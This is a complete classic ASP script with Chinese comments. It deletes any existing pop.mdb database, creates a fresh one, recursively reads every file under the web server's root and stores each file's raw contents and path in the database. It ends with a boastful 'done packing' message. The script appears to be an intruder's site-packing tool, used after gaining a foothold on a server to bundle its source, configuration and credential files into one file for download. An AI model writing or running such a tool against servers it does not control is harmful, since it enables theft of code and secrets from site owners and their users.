<%
dim dbfile,fso,sql
mdbfile="pop.mdb" '换成你其它数据库名字
dbfile=server.MapPath(mdbfile)
Set FSO = CreateObject("Scripting.FileSystemObject")
'如果数据库存在就删除原有数据
if fso.FileExists(dbfile) then
fso.DeleteFile(dbfile)
end if
set fso=nothing
'开始建立数据库
set cat=server.CreateObject("ADOX.Catalog")
'建立access2000的数据库
cat.Create "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & dbfile
set cat=nothing
if err.number=0 then
Response.Write "数据库 " & dbfile & " 创建成功<br> "
else
Response.Write "数据库创建失败，原因： " & err.description
Response.End
end if
'开始建表
Set Conn = Server.CreateObject("ADODB.Connection")
Conn.Open "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & dbfile
'建立表
sql="Create TABLE filedata([id] counter PRIMARY KEY,[path] Memo,[file] General)"
conn.execute(sql)
Set rs = CreateObject("ADODB.RecordSet")
rs.Open "FileData", conn, 1, 3
set obj=server.createobject("scripting.filesystemobject")
'获得网站根目录
set objfolder=obj.getfolder(server.mappath("/"))
'开始查找文件
search objfolder
response.write("累死你ToBa哥哥了,打完了")
'文件搜索函数
function search(objfolder)
dim objsubfolder
for each objfile in objfolder.files
Set objStream = Server.CreateObject("ADODB.Stream")
a=a+1
objStream.Type = 1
objStream.Open
response.write a &"<br>"
response.write objfile.path &"<br>"
'跳过数据库本身和.LDB文件
if right(objfile.path,len(mdbfile))=mdbfile or right(objfile.path,4)=".ldb" then
else
objStream.LoadFromFile objfile.path
rs.addnew
rs("file")=objstream.read
rs("Path")=right(objfile.path,len(objfile.path)-3)
rs.update
objStream.close
end if
next
for each objsubfolder in objfolder.subfolders
search objsubfolder
next
end Function
%>